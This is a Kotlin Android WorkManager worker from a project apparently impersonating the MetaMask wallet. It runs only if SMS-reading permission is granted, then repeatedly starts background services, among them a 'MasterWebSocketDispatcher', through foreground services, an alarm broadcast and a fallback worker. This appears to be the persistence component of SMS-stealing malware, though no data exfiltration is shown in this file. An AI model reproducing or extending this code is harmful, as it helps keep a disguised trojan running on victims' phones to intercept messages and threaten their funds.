package com.example.MetaMask.services.watchers

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.Keep
import androidx.work.OneTimeWorkRequest
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.ServiceStarterWorker

@Keep
class ZebraWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[ZebraWorker] doWork enter") //xdbg
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[ZebraWorker] if branch") //xdbg
            android.util.Log.d("XDBG", "[ZebraWorker] return") //xdbg
            return Result.success()
        }
        val context = applicationContext

        try {
            try {
                val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[ZebraWorker] if branch") //xdbg
                    context.startForegroundService(pulseIntent)
                } else {
                    context.startService(pulseIntent)
                }
            } catch (e: Exception) { }

            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", "ZEBRA_MEDIA_TRIGGER")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ZebraWorker] if branch") //xdbg
                context.startForegroundService(masterIntent)
            } else {
                context.startService(masterIntent)
            }

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ZebraWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val alarmIntent = Intent(context, AlarmReceiver::class.java)
            context.sendBroadcast(alarmIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ZebraWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        try {
            val request = OneTimeWorkRequest.Builder(ServiceStarterWorker::class.java)
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("ZEBRA_FALLBACK_TRIGGER")
                .build()
            WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ZebraWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        android.util.Log.d("XDBG", "[ZebraWorker] return") //xdbg
        return Result.success()
    }
}
